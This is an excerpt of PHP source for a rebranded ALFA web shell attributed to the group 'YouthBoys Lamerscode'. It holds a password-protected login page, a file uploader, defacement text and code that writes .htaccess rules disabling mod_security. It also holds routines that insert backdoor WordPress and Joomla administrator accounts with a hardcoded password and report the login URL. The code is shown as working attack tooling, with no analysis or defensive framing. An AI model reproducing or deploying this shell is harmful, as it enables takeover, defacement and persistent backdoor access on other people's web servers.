...
define("__ALFA_DATA_FOLDER__", "YBLC_C0DE");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/Lamersxcode/Records/main/media/icons-YBLC.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>.:./YouthBoys Lamerscode:.</b></font></th></tr>
...
}elseif($config['AlfaLoginPage']=='youthboys'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
...
<head>
    ...
    <meta name="description" content="$ .:./YouthBoys LAmerscode:. $" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link href="https://raw.githubusercontent.com/Lamersxcode/Records/main/media/logo-YBLC.png" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Lamersxcode/Records/main/media/logo-YBLC.png"/>
...
<body>
    <div class="terminal">
        <div class="headerTerm">
            ...
            <strong>
                YOUTHBOYS LAMERSC0DE ALFA LOGIN
            </strong>
        </div>
...
╰──➤
    ...
    typewriter
        .pauseFor(500)
        .typeString("YouthBoys Lamerscode Was Here")
        .pauseFor(2000)
        .deleteChars(30)
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ./YouthBoys Lamerscode ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/Lamersxcode/Records/main/media/icons-YBLC.png" /></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./YouthBoys Lamerscode &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>youthboys@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/yblamerscode'>./YouthBoys Lamerscode</a></span></div></td>
</tr>
</table>
</div>
...
<title>YouthBoys Lamerscode Was Here</title><textarea name=index rows='19' cols='103'><b>YouthBoys Lamerscode Was Here</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By YouthBoys";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By YouthBoys<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
...
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By YouthBoys\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
...
$table = array('td1' =>
 ...
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'YouthBoys', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => '!@!YouthBoys1337!@!', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: !@!YouthBoys1337!@!";
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'YouthBoys', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => '!@!YouthBoys1337!@!', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'youthboys@proton.me', 'inputSize' => '50')
);
create_table($table);
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$jomSuccess = "NEW JOOMLA ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/administrator/%0AUsername: ".$admin."%0APassword: !@!YouthBoys1337!@!";
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
